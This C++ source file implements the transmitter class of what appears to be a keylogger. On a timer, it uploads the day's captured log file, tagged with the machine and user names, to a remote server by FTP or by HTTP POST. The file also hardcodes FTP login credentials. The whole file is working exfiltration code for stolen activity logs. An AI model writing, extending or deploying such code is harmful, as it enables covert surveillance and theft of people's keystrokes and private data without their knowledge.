#include "pch.h"
#include "Transmitter.h"

// Transmitter() : Constructor of the transmitter class
Transmitter::Transmitter(Logger* logger)
{
	this->Transmitting = false; // Not transmitting by default

	this->Machine = Utilities::GetMachineName();
	this->User = Utilities::GetUsername();

	this->SetKey(""); // Default is none
	this->LastTransmission = ""; // Never occured yet
}

// Start() : Start sending log to server (ment to be lunch in a thread)
void Transmitter::Start()
{
	this->ftp();
}

// Stop() : Stop the transmitter 
void Transmitter::Stop()
{
	this->Transmitting = false;
}

// Ftp();
void Transmitter::ftp()
{
	this->Transmitting = true;
	cout << "FTP Transmitter Started" << endl;

	// Keep transmiting while transmitting is set to true
	while (this->IsTransmitting())
	{
		// If elapsed time is >= Waiting time constant defined in Transmitter.h
		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
		{
			// Initialize the ftp object 
			Ftp ftp;
			// Connect and login to server
			Ftp::Response response_connect = ftp.connect(SERVER_ADDRESS, SERVER_PORT);
			Ftp::Response response_login = ftp.login("pi", "8Mj3Rn2Mm!"); // FTP server configured to accept anonymous connexion
			cout << "[CONNECT] " << response_connect.getMessage() << endl << "[ LOGIN ] " << response_login.getMessage() << endl;

			Ftp::Response response_dir = ftp.createDirectory(Utilities::GetMachineName());
			cout << "[CRT DIR] " << response_dir.getMessage() << endl;

			Ftp::Response response_upload = ftp.upload(Utilities::GetCurrentDate() + ".log", Utilities::GetMachineName() + "/");
			cout << " [UPLOAD] " << response_upload.getMessage() << endl;

			// Disconnect from the FTP server
			ftp.disconnect();

			// Restart timer and actualise LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();
		}

		// Ease CPU
		sleep(microseconds(1000));
	}
	cout << "FTP Transmitter Stopped" << endl;
}

// Http();
void Transmitter::http()
{
	this->Transmitting = true;
	cout << "HTTP Transmitter Started" << endl;

	// Keep transmiting while transmitting is set to true
	while (this->IsTransmitting())
	{
		// If elapsed time is >= Waiting time constant defined in Transmitter.h
		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
		{
			// Initialize the http object and request
			Http http;
			http.setHost(SERVER_ADDRESS, 8000);
			Http::Request request(WEB_PAGE, Http::Request::Post);

			// Initialize the string stream containing the request
			ostringstream stream;

			// Open the currently active log file
			ifstream file(Utilities::GetCurrentDate() + ".log");

			// Getline by line file content
			string line;
			string content = "";
			while (getline(file, line)) // Even line = window name
			{
				content += line;
			}

			// Forge the http request
			stream << "machine=" << this->GetMachine() << "&user=" << this->GetUser() << "&file=" << content;
			request.setField("From", "Gaze");
			request.setField("Content-Type", "text/plain");
			request.setBody(stream.str());

			// Display request
			cout << stream.str() << endl;

			// Send request and get the response from the server
			Http::Response response = http.sendRequest(request);
			cout << response.getBody() << endl;

			// Restart timer and actualise LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();
		}
		// Ease CPU
		sleep(microseconds(1000));
	}
	cout << "HTTP Transmitter Stopped" << endl;
}

// IsTransmitting() : Return Transmitting value
bool Transmitter::IsTransmitting() const
{
	return this->Transmitting;
}

// GetMachine() : Return the machine name
string Transmitter::GetMachine() const
{
	return this->Machine;
}

// GetUser() : Return the window username
string Transmitter::GetUser() const
{
	return this->User;
}

// GetLastTransmission() : Return last time a transmission was done successfully 
string Transmitter::GetLastTransmission() const
{
	return this->LastTransmission;
}

// GetKey() : Return the encryption key
string Transmitter::GetKey() const
{
	return this->Key;
}

// SetKey(string) : Assign a value to the Key attribut
void Transmitter::SetKey(string key)
{
	this->Key = key;
}